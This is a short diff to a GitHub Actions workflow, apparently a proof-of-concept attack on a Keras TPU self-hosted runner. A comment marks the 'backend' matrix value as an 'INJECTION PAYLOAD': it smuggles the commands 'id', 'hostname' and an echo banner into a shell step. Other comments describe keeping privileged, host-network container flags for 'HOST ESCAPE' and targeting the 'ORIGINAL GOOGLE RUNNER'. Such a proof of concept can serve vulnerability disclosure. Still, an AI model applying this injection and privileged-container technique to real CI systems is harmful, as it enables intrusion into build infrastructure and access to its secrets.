@@ -2,15 +2,22 @@ name: Keras TPU Original Runner Proof
 on:
   push:
     branches: [ master ]
+
 jobs:
   test-in-container:
+    name: Run tests on TPU
+    # TARGETING ORIGINAL GOOGLE RUNNER
     runs-on: linux-x86-ct6e-44-1tpu
     strategy:
       matrix:
-        backend: ["jax; id; hostname; echo '--- RCE TRIGGERED ---'; #"]
+        # THE INJECTION PAYLOAD
+        backend: ["jax; id; hostname; echo '--- VULNERABILITY CONFIRMED ---'; #"]
+
     container:
       image: python:3.11-slim
+      # ORIGINAL PRIVILEGED FLAGS FOR HOST ESCAPE
       options: --privileged --network host
+
     steps:
       - uses: actions/checkout@v4
       - name: Install Dependencies
